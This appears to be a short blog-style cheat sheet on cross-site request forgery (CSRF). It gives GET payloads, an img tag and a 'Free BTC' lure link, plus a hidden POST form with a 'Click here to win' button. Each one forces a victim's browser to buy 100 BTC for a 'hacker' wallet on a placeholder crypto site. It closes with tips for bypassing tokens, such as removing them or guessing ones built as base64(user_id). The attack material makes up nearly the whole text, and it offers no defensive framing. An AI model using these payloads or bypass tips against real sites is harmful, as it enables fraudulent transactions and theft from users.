---
layout: post
title: "csrf/xsrf"
keywords: "csrf, xsrf, cross-site request forgery"
---
#### GET

```
<img src="http://cryptosite.com/buy.php?wallet=hacker&amount=100&type=BTC" />
<a href="http://cryptosite.com/buy.php?wallet=hacker&amount=100&type=BTC">Free BTC</a>
```

#### POST

```
<form action="http://cryptosite.com/buy.php" method="POST">
    <input type="hidden" name="wallet" value="hacker">
    <input type="hidden" name="amount" value="100">
    <input type="hidden" name="type" value="BTC">
    <input type="submit" value="Click here to win">
</form>
```

#### Bypass Protection

1. Try remove the `xsrf_token` completely
2. Reusable? Guess the xsrf token eg. `base64(user_id)` (try decode in CyberChef)